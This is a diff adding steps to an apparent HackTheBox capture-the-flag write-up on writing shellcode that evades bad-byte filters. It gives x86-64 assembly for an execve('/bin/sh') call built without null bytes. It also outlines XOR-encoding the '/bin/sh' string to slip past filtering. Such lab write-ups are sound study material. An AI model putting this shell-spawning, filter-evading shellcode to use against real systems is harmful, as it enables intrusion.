@@ -119,3 +119,55 @@ It shall bypassed the 59 filter, but introduced another bad bytes.
 
 9. Great! Now let's try to bypass the NULL byte first.
 10. Using the same method as previous to get rid of another bad byte introduced. I used `push` instruction to push the value first onto the stack pointer.
+
+```asm
+mov rax, 0x68732f6e69622f
+push rax
+mov rdi, rsp
+
+push 0x0
+pop rsi
+push 0x0
+pop rdx
+
+push 0x3a
+pop rax
+add al, 0x1
+syscall
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6c5bf020-824b-42e0-bf19-885c48574d10)
+
+
+11. Awesome! Just like what we're expect it to be. All the null bytes have been cleared.
+12. The idea is still the same. But it's quite tricky.
+13. I used XOR method to hide the `/bin/sh` strings.
+
+### IDEA
+
+```MD
+1. Identify which key is suitable for 0x68732f6e69622f, that does not gave any null bad bytes.
+2. Logic to hide the strings using XOR.
+3. XOR it back to obtain the original strings and stored it onto the stack.
+
+- So the idea is to push the KEY we identified previously onto the stack.
+
+mov rax, KEY
+push rax
+
+## [+] At this point, RSP stored the our KEY.
+
+- Then we perform the XOR operation of the key with BINSH strings, so we can obtain the XORed data.
+
+mov rax, KEY ^ BINSH strings.
+
+## [+] At this point RAX stored the XORed strings
+
+xor [rsp], rax
+
+## [+] At this point KEY stored on the stack is XORed with the previously XORed strings.
+
+This operation resulting to "/bin/sh" strings.
+```
